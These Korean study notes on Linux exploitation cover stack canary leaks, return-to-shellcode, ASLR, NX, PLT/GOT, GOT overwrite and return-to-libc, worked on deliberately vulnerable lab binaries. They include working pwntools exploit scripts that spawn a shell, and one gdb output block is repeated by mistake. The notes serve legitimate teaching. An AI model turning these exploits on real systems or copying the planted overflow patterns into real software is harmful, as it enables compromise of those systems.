스택 카나리를 읽을 수 있는 취약점이 있다면, 이를 이용하여 카나리 검사를 우회할 수 있다.

```C
// Name: bypass_canary.c
// Compile: gcc -o bypass_canary bypass_canary.c

#include <stdio.h>
#include <unistd.h>

int main()
{
	char memo[8];
	char name[8];
	
	printf("name : ");
	read(0, name, 64);
	printf("hello %s\n", name);
	
	printf("memo : ");
	read(0, memo, 64);
	printf("memo %s\n", memo);
	
	return 0;
}
```

## Return to Shellcode

```C
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

int main()
{
	char buf[0x50];
	
	printf("Address of the buf: %p\n", buf);
	printf("Distance between buf and $rbp: %ld\n", (char*)__builtin_frame_address(0) - buf);
	
	printf("[1] Leak the canary\n");
	printf("Input: ");
	fflush(stdout);
	
	read(0, buf, 0x100);
	printf("Your input is '%s'\n", buf);
	
	puts("[2] Overwrite the return address");
	printf("Input: ");
	fflush(stdout);
	gets(buf);
	
	return 0;
}
```

### 보호기법 탐지
바이러니 파일에 적용된 보호기법에 따라 익스플로잇 설계가 달라지므로 분석을 시도하기 전에 먼저 적용된 보호기법을 파악해보는 것이 좋다.
보호기법을 파악할 때는 주로 checksec을 사용한다.

> ##### checksec.sh
> pwntools의 checksec을 사용할 수 없어서 checksec.sh를 설치하였다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage6 
╰─$ checksec.sh --file ./r2s                                                                                1 ↵
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   ./r2s
```

checksec을 통해 파악할 수 있는 보호기법은 RELRO, Canary, NX, PIE 4가지이다.

### 취약점 탐색
1. buf의 주소

```C
printf("Address of the buf: %p\n", buf);
printf("Distance between buf and $rbp: %ld\n", (char*)__builtin_frame_address(0) - buf);
```

여기서는 `buf`의 주소 및 `rbp`와 `buf`사이의 주소 차이를 알려준다.

2. 스택 버퍼 오버플로우

```C
char buf[0x50];

read(0, buf, 0x100);  // 0x50 < 0x100
gets(buf);            // Unsafe function
```

코드를 살펴보면 스택 버퍼인 `buf`에 총 두 번의 입력을 받는다. 그런데 두 입력 모두에서 오버플로우가 발생한다.

### 익스플로잇 시나리오
1. 카나리 우회
두 번째 입력으로 반환 주소를 덮을 수 있지만 카나리가 조작되면 `__stack_chk_fail` 함수에 의해 프로그램이 강제 종료된다. 따라서 첫번째 입력에서 카나리를 구하고 이를 두번째 입력에 사용해야 한다.

```C
read(0, buf, 0x100); // Fill buf until it meets canary
printf("Your input is '%s'\n", buf);
```

2. 셸 획득
여기에는 셸을 획득하는 함수가 없기 때문에 직접 셸코드를 주입하고 해당 주소로 반환 주소를 설정해야 한다. 여기서는 주소를 알고 있는 `buf`에 셸코드를 주입하고 해당 주소로 실행 흐름을 옮기면 셸을 획득할 수 있을 것이다.

### 스택 프레임 정보 수집
스택을 이용하여 공격하기 위해서는 스택 프레임의 구조를 파악해야 한다. 여기서는 스택 프레임에서의 `buf` 위치를 보여주므로, 이를 적절히 파싱하면 된다.

```python
# r2s.py

from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./r2s")

context.arch = "amd64"

p.recvuntil("buf: ")
buf = int(p.recvline()[:-1], 16)

slog("Address of buf", buf)

p.recvuntil("$rbp: ")
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8

slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)
```

### 카나리 릭
앞서 구한 스택 프레임의 구조를 이용하여 카나리를 구하도록 코드를 추가한다.

```python
payload = b"A"*(buf2cnry + 1)  # (+1) because of the first null-byte

p.sendafter("Input:", payload)
p.recvuntil(payload)
cnry = u64(b"\x00"+p.recvn(7))

slog("Canary", cnry)
```

### 익스플로잇
카나리의 값을 구했으므로 셸코드를 작성하여 buf에 주입하고, 반환 주소를 buf로 덮는다.

```python
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b"A") + p64(cnry) + b"B"*0x8 + p64(buf)
# gets() receives input until "\n" is received

p.sendlineafter("Input:", payload)

p.interactive()
```

컴퓨터 과학에서는 임의의 코드를 실행하는 것을 Arbitrary Code Execution(ACE), 원격 서버를 대상으로 ACE를 수행하는 것을 Remote Code Execution(RCE)라고 부른다.

# Stage 7 : Bypass NX & ASLR
보안 수준의 향상을 위해서는 하나의 취약점만 보호하는 것이 아니라 다양한 보호 기법을 적용하여 Attack Surface를 줄이는 것이 필요하다. r2s에서 셸코드를 실행할 수 있었던 이유는 반환 주소를 임의 주소로 덮을 수 있었고, 사용자가 데이터를 입력할 수 있는 버퍼의 주소를 알 수 있었으며, 그 버퍼가 실행 가능했기 때문이다. 첫번째 취약점의 경우 카나리를 통해 보호하였지만 이는 곧 카나리만 우회하면 셸코드를 실행시킬 수 있음을 의미한다. 그렇기 때문에 개발자들은 나머지 취약점에 대한 보호 기법을 개발하였는데, 이것이 Address Space Layout Randomization(ASLR)과 No-eXecute(NX)이다.

## NX & ASLR
### ASLR
ASLR은 바이너리가 실행될 때마다 스택, 힙, 공유 라이브러리 등을 임의의 주소에 할당하는 보호 기법이다. [Return to shellcode](https://gist.github.com/kakunge/22ec7f3fce585c317978b511f6a645bf#return-to-shellcode)에서 r2s는 ASLR이 적용되어 실행할 때마다 buf의 주소가 변경되었다.
ASLR은 커널에서 지원하는 보호 기법이며, 다음의 명령어로 확인할 수 있다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/wargames/ssp_001 
╰─$ cat /proc/sys/kernel/randomize_va_space 
2
```

리눅스에서 이 값은 0, 1, 2를 가질 수 있으며 각 ASLR이 적용되는 메모리 영역은 다음과 같다.
- No ASLR(0): ASLR을 적용하지 않음
- Conservative Randomization(1): 스택, 힙, 라이브러리, vdso 등
- Conservative Randomization + brk(2): (1)의 영역과 `brk`로 할당한 영역

```C
// Name: addr.c
// Compile: gcc addr.c -o addr -ldl -no-pie -fno-PIE

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
	char buf_stack[0x10]; // 스택 버퍼
	char *buf_heap = (char *)malloc(0x10); // 힙 버퍼
	
	printf("buf_stack addr: %p\n", buf_stack);
	printf("buf_heap addr: %p\n", buf_heap);
	printf("libc_base addr: %p\n", *(void **)dlopen("libc.so.6", RTLD_LAZY)); // 라이브러리 주소
	printf("printf addr: %p\n", dlsym(dlopen("libc.so.6", RTLD_LAZY), "printf")); // 라이브러리 함수의 주소
	printf("main addr: %p\n", main); // 코드 영역의 함수 주소
}
```

위의 코드를 통해 ASLR을 살펴본다.

### ASLR의 특징

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ ./addr 
buf_stack addr: 0x7ffd944efab0
buf_heap addr: 0x1275260
libc_base addr: 0x7f7505655000
printf addr: 0x7f75056b9e40
main addr: 0x400667
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ ./addr
buf_stack addr: 0x7ffdbcb75400
buf_heap addr: 0x157a260
libc_base addr: 0x7f2ed49a3000
printf addr: 0x7f2ed4a07e40
main addr: 0x400667
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ ./addr
buf_stack addr: 0x7ffc12cf7db0
buf_heap addr: 0xef0260
libc_base addr: 0x7f4dad008000
printf addr: 0x7f4dad06ce40
main addr: 0x400667
```

addr.c는 메모리의 주소를 출력하는 코드로 실행하면 위와 같은 결과를 얻을 수 있다. 실행 결과로 스택 영역의 buf_stack, 힙 영역의 buf_heap, 라이브러리 함수 printf, 코드 영역의 함수 main, 그리고 라이브러리 매핑 주소 libc_base가 출력되었다. 이를 통해 다음과 같은 사실을 알 수 있다.
- main 함수의 주소를 제외한 나머지 값은 모두 실행할 때마다 바뀐다. 따라서 바이너리를 실행하기 전에 해당 영역들의 주소를 예측할 수 없다.
- 바이너리를 반복해서 실행해도 libc_base와 printf의 주소 하위 12비트 값은 변경되지 않는다. 리눅스는 ASLR이 적용됐을 때, 파일을 페이지(page)1 단위로 임의 주소에 매핑하기 때문에 페이지의 크기인 12비트 이하로는 주소가 변경되지 않는다.
- libc_base와 printf의 주소 차이는 항상 같다. ASLR이 적용되면 라이브러리는 임의 주소에 매핑되지만 라이브러리 파일을 그대로 매핑하는 것이기 때문에 매핑된 주소로부터 라이브러리의 다른 심볼들 까지의 거리(Offset)는 항상 같다.

```python
>>> hex(0x7f7505655000-0x7f75056b9e40)
'-0x64e40'
>>> hex(0x7f2ed49a3000-0x7f2ed4a07e40)
'-0x64e40'
>>> hex(0x7f4dad008000-0x7f4dad06ce40)
'-0x64e40'
```

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ objdump -D /lib/x86_64-linux-gnu/libc.so.6 | grep 064e40 -A3
0000000000064e40 <_IO_printf@@GLIBC_2.2.5>:
   64e40:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   64e47:	84 c0                	test   %al,%al
   64e49:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
```

### NX
NX는 실행에 사용되는 메모리 영역과 쓰기에 사용되는 메모리 영역을 분리하는 보호 기법이다. 어떤 메모리 영역에 대해 쓰기 권한과 실행 권한이 함께 있으면 시스템이 취약해지기 쉽기 때문이다.
CPU가 NX를 지원하면 컴파일러 옵션을 통해 바이너리에 NX를 적용할 수 있고 NX가 적용된 바이너리는 실행될 때 각 메모리 영역에 필요한 권한만을 부여받는다.
NX가 적용된 바이너리에는 코드 영역 외에 실행 권한이 없지만 NX가 적용되지 않은 바이너리에는 스택, 힙, 데이터 영역에 실행 권한이 존재한다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ checksec.sh --file r2s_nx 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   r2s_nx

╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ checksec.sh --file r2s 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   r2s
```

checksec을 이용해서 바이너리에 NX가 적용되었는지 확인할 수 있다.

> ##### NX의 다양한 명칭
> NX를 인텔은 XD(eXecute Disable), AMD는 NX, 윈도우는 DEP(Data Execution Prevention), ARM에서는 XN(eXecute Never)라고 칭하고 있다. 이들은 명칭만 다를 뿐 모두 비슷한 보호 기법이다.

```python
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ python3 r2s.py 
[+] Starting local process './r2s_nx': pid 13003
[+] Address of buf: 0x7ffd38704d10
[+] buf <=> sfp: 0x60
[+] buf <=> canary: 0x58
[+] Canary: 0xd1762a3dd12e900
[*] Switching to interactive mode
 [*] Got EOF while reading in interactive
$ 
[*] Process './r2s_nx' stopped with exit code -11 (SIGSEGV) (pid 13003)
```

NX가 적용된 파일을 대상으로 익스플로잇 코드를 실행하면 Segmentation fault가 발생한다. 이는 NX가 적용되어 스택 영역에 실행 권한이 사라지게 되면서, 셸코드가 실행되지 못하고 종료된 것이다.

NX와 ASLR이 적용되면 스택, 힙, 데이터 영역에는 실행 권한이 제거되며, 이들이 할당되는 주소가 계속 변한다. 그러나 바이너리의 코드가 존재하는 영역은 여전히 실행 권한이 존재하며 할당되는 주소도 고정되어 있다.
코드 영역에는 유용한 코드 가젯들과 함수가 포함되어 있다. 반환 주소를 셸 코드로 직접 덮는 대신 이들을 활용하면 NX와 ASLR을 우회하여 공격할 수 있다. 대표적인 공격 방법으로는 RTL(Return-to-Libc)과 ROP(Return Oriented Programming)가 있다.

## Library - Static Link vs. Dynamic Link
### 라이브러리
라이브러리는 컴퓨터 시스템에서 프로그램들이 함수나 변수를 공유해서 사용할 수 있게 한다.
C언어를 포함한 많은 컴파일 언어들은 자주 사용되는 함수들의 정의를 묶어서 하나의 라이브러리 파일로 만들고 이를 여러 프로그램이 공유해서 사용할 수 있도록 지원한다. 라이브러리를 사용하면 같은 함수를 반복적으로 정의하지 않아도 되기 때문에 코드 개발의 효율이 높아진다는 장점이 있다.
각 언어에서 범용적으로 많이 사용되는 함수들은 표준 라이브러리가 제작되어 있어서 개발자들은 쉽게 해당 함수들을 사용할 수 있다. 대표적으로 C의 표준 라이브러리인 libc는 우분투에 기본으로 탑재된 라이브러리이며 실습환경에서는 /lib/x86_64-linux-gnu/libc-2.27.so에 있다.

### 링크
프로그램에서 어떤 라이브러리의 함수를 사용한다면 호출된 함수와 실제 라이브러리의 함수가 링크 과정에서 연결된다.

```C
// Name: hello-world.c
// Compile: gcc -o hello-world hello-world.c

#include <stdio.h>

int main()
{
	puts("Hello, world!");
	
	return 0;
}
```

리눅스에서 C 소스 코드는 전처리, 컴파일, 어셈블 과정을 거쳐 ELF형식을 갖춘 오브젝트 파일로 번역된다. 다음 명령어로 소스 코드를 어셈블할 수 있다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ gcc -c hello-world.c -o hello-world.o
```

오브젝트 파일은 실행 가능한 형식을 갖추고 있지만 라이브러리 함수들의 정의가 어디 있는지 알지 못하므로 실행은 불가능하다. 

다음 명령어를 실행해보면 puts의 선언이 stdio.h에 있어서 심볼(Symbol)로는 기록되어 있지만 심볼에 대한 자세한 내용은 하나도 기록되어 있지 않다. 심볼과 관련된 정보들을 찾아서 최종 실행 파일에 기록하는 것이 링크 과정에서 하는 일 중 하나이다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ readelf -s hello-world.o | grep puts
    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND puts
```

소스 코드를 완전히 컴파일하여 링크되기 전과 비교해보면 libc에서 puts의 정의를 찾아 연결한 것을 확인할 수 있다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ readelf -s hello-world | grep puts
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ ldd hello-world
	linux-vdso.so.1 (0x00007ffd854c8000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff8e3ad2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff8e40c5000)
```

여기서 libc가 있는 /lib/x86_64-linux-gnu/가 표준 라이브러리 경로에 포함되어 있기 때문에 libc를 같이 컴파일하지 않았음에도 libc에서 해당 심볼을 탐색하였다.

gcc는 소스 코드를 컴파일할 때 표준 라이브러리의 라이브러리 파일들을 모두 탐색한다. 다음 명령어로 표준 라이브러리의 경로를 확인할 수 있다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ ld --verbose | grep SEARCH_DIR | tr -s ' ;' '\n' 
SEARCH_DIR("=/usr/local/lib/x86_64-linux-gnu")
SEARCH_DIR("=/lib/x86_64-linux-gnu")
SEARCH_DIR("=/usr/lib/x86_64-linux-gnu")
SEARCH_DIR("=/usr/lib/x86_64-linux-gnu64")
SEARCH_DIR("=/usr/local/lib64")
SEARCH_DIR("=/lib64")
SEARCH_DIR("=/usr/lib64")
SEARCH_DIR("=/usr/local/lib")
SEARCH_DIR("=/lib")
SEARCH_DIR("=/usr/lib")
SEARCH_DIR("=/usr/x86_64-linux-gnu/lib64")
SEARCH_DIR("=/usr/x86_64-linux-gnu/lib")
```

링크를 거치고 나면 프로그램에서 puts를 호출할 때, puts의 정의가 있는 libc에서 puts의 코드를 찾고, 해당 코드를 실행하게 된다.

### 라이브러리와 링크의 종류
라이브러리는 크게 동적 라이브러리와 정적 라이브러리로 구분되며 동적 라이브러리를 링크하는 것을 동적 링크(Dynamic Link), 정적 라이브러리를 링크하는 것을 정적 링크(Static Link)라고 한다.

##### 동적 링크
동적 링크된 바이너리를 실행하면 동적 라이브러리가 프로세스의 메모리에 매핑된다. 실행 중에 라이브러리의 함수를 호출하면 매핑된 라이브러리에서 호출할 함수의 주소를 찾고 그 함수를 실행한다.

##### 정적 링크
정적 링크를 하면 바이너리에 정적 라이브러리의 필요한 모든 함수가 포함된다. 따라서 해당 함수를 호출할 때 라이브러리를 참조하는 것이 아니라 자신의 함수를 호출하는 것처럼 호출할 수 있다.

> 정적 링크 시 컴파일 옵션에 따라 include 한 헤더의 함수가 모두 포함될 수도 있고 그렇지 않을 수도 있다.

### 동적 링크 vs. 정적 링크
앞선 hello-world.c 코드를 정적 컴파일하여 static을, 동적 컴파일하여 dynamic을 생성한다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ gcc -o static hello-world.c -static
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ gcc -o dynamic hello-world.c -no-pie
```

##### 용량
각각의 용량을 ls 명령어로 확인해보면 static이 dynamic보다 약 100배 더 큰 용량을 가지는 것을 확인할 수 있다.

```zsh
╭─kakunge@ubuntu ~/Documents/syshack/stage7 
╰─$ ls -lh ./static ./dynamic
-rwxrwxr-x 1 kakunge kakunge 8.1K Nov 11 23:43 ./dynamic
-rwxrwxr-x 1 kakunge kakunge 826K Nov 11 23:43 ./static
```

##### 호출 방법

__static__
```gdb
main:
   0x0000000000400b6d <+0>:	push   rbp
   0x0000000000400b6e <+1>:	mov    rbp,rsp
   0x0000000000400b71 <+4>:	lea    rdi,[rip+0x915cc]        # 0x492144
   0x0000000000400b78 <+11>:	call   0x410120 <puts>
   0x0000000000400b7d <+16>:	mov    eax,0x0
   0x0000000000400b82 <+21>:	pop    rbp
   0x0000000000400b83 <+22>:	ret
```

__dynamic__
```gdb
main:
   0x00000000004004e7 <+0>:	push   rbp
   0x00000000004004e8 <+1>:	mov    rbp,rsp
   0x00000000004004eb <+4>:	lea    rdi,[rip+0x92]        # 0x400584
   0x00000000004004f2 <+11>:	call   0x4003f0 <puts@plt>
   0x00000000004004f7 <+16>:	mov    eax,0x0
   0x00000000004004fc <+21>:	pop    rbp
   0x00000000004004fd <+22>:	ret
```

static에서는 puts가 있는 0x410120를 직접 호출하지만 dynamic에서는 puts의 plt 주소인 0x4003f0를 호출한다. plt는 동적 링크된 바이너리가 함수의 주소를 라이브러리에서 찾는 과정에 사용되는 테이블이다.

### PLT와 GOT
PLT(Procedure Linkage Table)와 GOT(Global Offset Table)는 라이브러리에서 동적 링크된 심볼의 주소를 찾을 때 사용하는 테이블이다.
바이너리가 실행되면 ASLR에 의해 라이브러리가 임의의 주소에 매핑된다. 이 상태에서 라이브러리 함수를 호출하면 함수의 이름을 바탕으로 라이브러리에서 심볼들을 탐색하고 해당 함수의 정의를 발견하면 그 주소로 실행 흐름을 옮기게 된다. 이러한 전 과정을 통틀어 runtime resolve라고 한다.

반복적으로 호출되는 함수의 정의를 매번 탐색하는 것은 비효율적이기 때문에 ELF는 GOT라는 테이블을 두고 resolve된 함수의 주소를 해당 테이블에 저장하고 나중에 다시 해당 함수를 호출하면 저장된 주소를 꺼내서 사용한다.

다음 코드를 통해 실제 동작을 살펴본다.

```C
// Name: got.c
// Compile: gcc -o got got.c

#include <stdio.h>

int main()
{
	puts("Resolving address of 'puts'.");
	puts("Get address from GOT");
}
```

##### resolve되기 전

> 이 부분은 pwndbg에서 checksec 관련 함수(got 포함)가 실행이 되지 않는 관계로 dreamhack의 예시를 사용한다.

got.c를 컴파일하여 실행한 직후에 GOT를 확인해보면 아직 puts의 주소를 찾기 전이기 때문에 함수의 주소가 아닌 `puts@plt+6`라는 PLT 내부의 주소가 적혀있다.

```gdb
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 1
[0x601018] puts@GLIBC_2.2.5 -> 0x4003f6 (puts@plt+6) ◂— push 0 /* 'h' */
```

puts@plt를 호출하는 지점에 bp를 설정하고 내부로 들어가면 PLT에서는 먼저 puts의 GOT인 0x601018에 쓰인 값으로 실행 흐름을 옮긴다. 현재 GOT에는 puts@plt+6의 주소가 쓰여있기 때문에 바로 다음 줄의 코드를 실행한다.

```gdb
pwndbg> b *main+11
pwndbg> c
pwndbg> si
=> 0x4003f0 <puts@plt> jmp qword ptr [rip + 0x200c22] <0x601018>
   0x4003f6 <puts@plt+6> push 0
   0x4003fb <puts@plt+11> jmp
   0x4003e0 <0x4003e0>
pwndbg> ni
   0x4003f0 <puts@plt> jmp qword ptr [rip + 0x200c22] <0x601018>
=> 0x4003f6 <puts@plt+6> push 0
   0x4003fb <puts@plt+11> jmp
   0x4003e0 <0x4003e0>
```

여기서 코드를 조금 더 실행시키면 dl_runtime_resolve_xsavec라는 함수가 실행되는데 이 함수에서 puts의 주소가 구해지고 GOT에 주소가 써진다.

```gdb
...
pwndbg> ni
   0x4003e6 jmp qword ptr [rip + 0x200c24] <_dl_runtime_resolve_xsavec>
=> 0x7ffff7dea910 <_dl_runtime_resolve_xsavec> push rbx
pwndbg> finish
   0x4004f2 <main+11> call puts@plt <puts@plt>
=> 0x4004f7 <main+16> lea rdi, qword ptr [rip + 0xb3]
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 1
[0x601018] puts@GLIBC_2.2.5 -> 0x7ffff7a62aa0 (puts) ◂— push r13
```

##### resolve된 후
두 번째로 puts@plt를 호출할 때는 GOT에 puts의 주소가 쓰여있어서 바로 puts가 실행된다.

```gdb
pwndbg> si
=> 0x4003f0 <puts@plt> jmp qword ptr [rip + 0x200c22] <puts>
   0x7ffff7a62aa0 <puts> push r13
```

### 시스템 해킹의 관점에서 본 PLT와 GOT
PLT와 GOT는 동적 링크된 바이너리에서 라이브러리 함수의 주소를 찾고 기록할 때 사용되는 중요한 테이블이다. 그러나 시스템 해커의 관점에서 보면 PLT에서 GOT를 참조하여 실행 흐름을 옮길 때 GOT의 값을 검증하지 않는다는 보안상의 약점이 있다. 따라서 앞의 예에서 GOT에 저장된 puts의 주소를 공격자가 임의로 변경할 수 있으면 두 번째로 puts가 호출될 때 공격자가 원하는 코드가 실행되게할 수 있다.

앞의 got바이너리의 두 번째 puts 호출 직전에 puts의 GOT 값을 “AAAAAAAA”로 변경하고 계속 실행시키면, 실제로 “AAAAAAAA”로 실행 흐름이 옮겨지는 것을 확인할 수 있습니다.

```gdb
pwndbg> b *main+23
pwndbg> r
=> 0x4004fe <main+23> call puts@plt <puts@plt>
		s: 0x4005b1 ◂— 'Get address from GOT'
   0x400503 <main+28> mov eax, 0
pwndbg> set *(unsigned long long*)0x601018 = 0x4141414141414141
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004003f0 in puts@plt ()
0x4003f0 <puts@plt> jmp qword ptr [rip + 0x200c22] <0x4141414141414141>
```

이런 공격 기법을 GOT Overwrite라고 부르며 임의 주소에 값을 쓸 수 있을 때 RCE를 하기 위한 방법으로 사용될 수 있다.

## Return to Library
### Return To Library
NX로 인해 공격자가 버퍼에 주입한 셸 코드를 실행하기는 어려워졌다. 그러나 스택 버퍼 오버플로우 취약점으로 반환 주소를 덮는 것은 여전히 가능하기 때문에 공격자들은 실행 권한이 남아있는 코드 영역으로 반환 주소를 덮는 공격 기법을 고안했다.
프로세스에 실행 권한이 있는 메모리 영역은 일반적으로 바이너리의 코드 영역과 바이너리가 참조하는 라이브러리의 코드 영역이다.
리눅스에서 C언어로 작성된 프로그램이 참조하는 libc에는 system, execve와 같은 프로세스의 실행과 관련된 함수들이 구현되어 있다. 공격자들은 libc의 함수들로 NX를 우회하고 셸을 획득하는 공격 기법을 개발하고 이를 Return To Libc라고 하였다. 이 방법은 libc가 아닌 다른 라이브러리에도 적용이 가능하므로 Return To Library라고도 부른다.

```C
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main()
{
	char buf[0x30];
	
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	
	// Add system function to plt's entry
	system("echo 'system@plt'");
	
	// Leak canary
	printf("[1] Leak Canary\n");
	printf("Buf: ");
	read(0, buf, 0x100);
	printf("Buf: %s\n", buf);
	
	// Overwrite return address
	printf("[2] Overwrite return address\n");
	printf("Buf: ");
	read(0, buf, 0x100);
	
	return 0;
}
```

여기서는 위의 코드를 예제로 사용한다.

### 보호 기법

```zsh
╭─leekyohyun@ubuntu ~/Documents/syshack/stage7 
╰─$ checksec rtl
[*] '/home/leekyohyun/Documents/syshack/stage7/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

checksec을 이용해서 확인해보면 rtl에는 카나리가 존재하고 NX가 적용되어 있다. ASLR은 커널에서 기본적으로 적용되기 때문에 특별한 언급이 없다면 적용된 것이다.

### 코드 분석
##### "/bin/sh"를 코드 섹션에 추가
rtl.c의 8번째 줄은 "/bin/sh"를 코드 섹션에 추가한다. ASLR이 적용되어도 PIE가 적용되지 않으면 코드 세그먼트와 데이터 세그먼트의 주소는 고정되기 때문에 "/bin/sh"의 주소도 고정된다.

##### system 함수를 PLT에 추가
rtl.c의 18번째 줄은 PLT에 system을 추가한다. PLT와 GOT는 라이브러리 함수의 참조를 위해 사용하는 테이블이다. 여기서 PLT에는 함수의 주소가 resolve되지 않았을 때 함수의 주소를 구하고 실행하는 코드가 적혀있다. 따라서 PLT에 어떤 라이브러리 함수가 등록되어 있다면 그 함수의 PLT 엔트리를 실행함으로써 함수를 실행할 수 있다. ASLR이 걸려 있어도 PIE가 적용되어 있지 않다면 PLT의 주소는 고정되기 때문에 무작위 주소에 매핑되는 라이브러리의 베이스 주소를 몰라도 이 방법을 라이브러리 함수를 실행할 수 있다. 이러한 공격 기법을 Return to PLT라고 한다.
여기서는 PLT를 이용하여 NX를 우회한다.

##### 버퍼 오버플로우
rlt.c의 21부터 29번째줄은 두 번의 오버플로우로 스택 카나리를 우회하고 반환 주소를 덮을 수 있도록 작성된 코드이다.

### 익스플로잇 설계
##### 1. 카나리 우회
첫 번째 입력에서 적절한 길이의 데이터를 입력하여 카나리를 구한다.

##### 2. rdi 값을 "/bin/sh"의 주소로 설정 및 셸 획득
두 번째 입력으로 반환 주소를 덮을 수 있다. 그러나 NX가 적용되어 있기 때문에 buf에 셸코드를 주입하고 이를 실행할 수는 없다. 따라서 다른 방법으로 셸을 획득해야 한다.
여기서 알고 있는 정보는 다음과 같다.
- "/bin/sh"의 주소를 안다.
- system 함수의 PLT 주소를 안다. 따라서 system 함수를 호출할 수 있다.

system("/bin/sh")를 호출하면 셸을 획득할 수 있으며, 이는 x86-64 호출 규약에 따라 rdi="/bin/sh" 주소인 상태에서 system 함수를 호출한 것과 같다. 이를 위해서는 리턴 가젯을 활용해야 한다.

### 리턴 가젯
리턴 가젯이란 ret로 끝나는 어셈블리 코드 조각을 의미한다.

```
0x0000000000400853 : pop rdi ; ret
```

NX로 인해 셸코드를 실행할 수 없는 상황에서는 단 한 번의 함수 실행으로 셸을 획득하는 것은 일반적으로 불가능하다. 리턴 가젯은 반환 주소를 덮는 공격의 유연성을 높여서 익스플로잇에 필요한 조건을 만족할 수 있게 한다. 예를 들어 여기서는 rdi의 값을 "/bin/sh"의 주소로 설정하고 system 함수를 호출해야 한다. 리턴 가젯을 이용하여 반환 주소와 이후의 버퍼를 다음과 같이 덮으면 pop rdi로 rdi를 “/bin/sh”의 주소로 설정하고, 이어지는 ret로 system 함수를 호출할 수 있다.

```
addr of ("pop rdi; ret") <= return address
addr of string "/bin/sh" <= ret + 0x8
addr of "system" plt <= ret + 0x10
```

대부분의 함수는 ret로 종료되기 때문에 함수들도 리턴 가젯으로 사용될 수 있다.

### 카나리 우회

```python
from pwn import *

p = process("./rtl")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)
```

```
[+] Starting local process './rtl': pid 3218
[*] '/home/leekyohyun/Documents/syshack/stage7/rtl'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] canary: 0x3d2937647b45e500
```

### 리턴 가젯 찾기
리턴 가젯은 일반적으로 ROPgadget을 사용하여 찾는다.

```
╭─leekyohyun@ubuntu ~/Documents/syshack/stage7 
╰─$ ROPgadget --binary ./rtl --re "pop rdi"
Gadgets information
============================================================
0x0000000000400853 : pop rdi ; ret
```

--re 옵션을 사용하여 정규표현식으로 가젯을 필터링할 수 있다.

### 익스플로잇

```
addr of ("pop rdi; ret") <= return address
addr of string "/bin/sh" <= ret + 0x8
addr of "system" plt <= ret + 0x10
```

위와 같이 가젯을 구성하고 실행하면 system("/bin/sh")를 실행할 수 있다.

```gdb
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc-2.27.so    0x7ffff7b95d88 0x68732f6e69622f /* '/bin/sh' */
```

"/bin/sh"의 주소는 pwndbg를 이용해서 찾을 수 있다.

```gdb
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
libc-2.27.so    0x7ffff7b95d88 0x68732f6e69622f /* '/bin/sh' */
```

system 함수의 plt 주소도 pwndbg를 이용해서 찾을 수 있다.

